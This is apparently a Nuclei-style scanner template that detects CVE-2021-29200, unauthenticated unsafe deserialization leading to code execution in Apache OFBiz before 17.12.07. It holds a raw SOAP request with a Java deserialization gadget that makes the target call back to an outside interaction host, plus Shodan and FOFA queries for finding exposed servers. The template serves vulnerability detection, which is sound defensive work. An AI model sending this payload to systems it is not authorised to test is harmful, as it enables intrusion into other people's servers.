http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: body
    type: word
    words:
    - value="responseMessage"
  matchers-condition: and
  raw:
  - "POST /webtools/control/SOAPService HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/xml\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    >\n  <soapenv:Header/>\n    <soapenv:Body>\n      <ser>\n        <map-HashMap>\n\
    \          <map-Entry>\n            <map-Key>\n              <cus-obj>{{generate_java_gadget(\"\
    dns\", \"http://{{interactsh-url}}\", \"hex\")}}</cus-obj>\n            </map-Key>\n\
    \            <map-Value>\n              <std-String value=\"STDSTRING\"/>\n  \
    \          </map-Value>\n          </map-Entry>\n        </map-HashMap>\n    \
    \ </ser>\n  </soapenv:Body>\n</soapenv:Envelope>\n"
id: CVE-2021-29200
info:
  author: your3cho
  classification:
    cpe: cpe:2.3:a:apache:ofbiz:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-29200
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-502
    epss-percentile: 0.98567
    epss-score: 0.90403
  description: 'Apache OFBiz has unsafe deserialization prior to 17.12.07 version
    An unauthenticated user can perform an RCE attack

    '
  metadata:
    fofa-query: app="Apache_OFBiz"
    max-request: 1
    product: ofbiz
    shodan-query: html:"OFBiz"
    vendor: apache
  name: Apache OFBiz < 17.12.07 - Arbitrary Code Execution
  reference:
  - http://www.openwall.com/lists/oss-security/2021/04/27/4
  - https://nvd.nist.gov/vuln/detail/CVE-2021-29200
  - https://github.com/freeide/CVE-2021-29200
  - https://lists.apache.org/thread.html/r108a964764b8bd21ebd32ccd4f51c183ee80a251c105b849154a8e9d%40%3Ccommits.ofbiz.apache.org%3E
  - https://lists.apache.org/thread.html/r708351f1a8af7adb887cc3d8a92bed8fcbff4a9e495e69a9ee546fda%40%3Cnotifications.ofbiz.apache.org%3E
  severity: critical
  tags: cve2021,cve,apache,ofbiz,deserialization,rce
